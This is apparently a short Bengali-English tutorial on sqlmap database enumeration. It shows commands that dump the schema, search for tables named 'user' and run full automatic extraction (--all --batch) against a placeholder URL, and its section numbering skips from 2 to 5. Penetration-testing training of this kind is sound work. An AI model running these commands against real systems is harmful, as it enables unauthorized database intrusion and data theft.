# **Advanced Database Enumeration**


## 1. DB Schema Enumeration

সব টেবিলের structure দেখতে এবং পুরো database architecture বুঝতে `--schema` ব্যবহার করা হয়।

```
sqlmap -u "http://www.example.com/?id=1" --schema
```

## 2. Searching for Data

অনেক table ও column থাকলে নির্দিষ্ট keyword দিয়ে database, table এবং column খুঁজতে `--search` ব্যবহার করা হয়। এটি `LIKE` operator দিয়ে identifier name খোঁজে।

`user` keyword থাকা table খোঁজা:

```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

## 5. Automatic Enumeration

`--all` এবং `--batch` একসাথে ব্যবহার করলে SQLMap target-এর পুরো enumeration process automatically চালায় এবং সব enumeration details দেয়।

```
sqlmap -u "http://www.example.com/?id=1" --all --batch
```

- Target থেকে accessible সবকিছু retrieve করার চেষ্টা করবে।
- Process অনেক দীর্ঘ সময় চলতে পারে।
- Output files থেকে প্রয়োজনীয় data manually খুঁজে নিতে হবে।
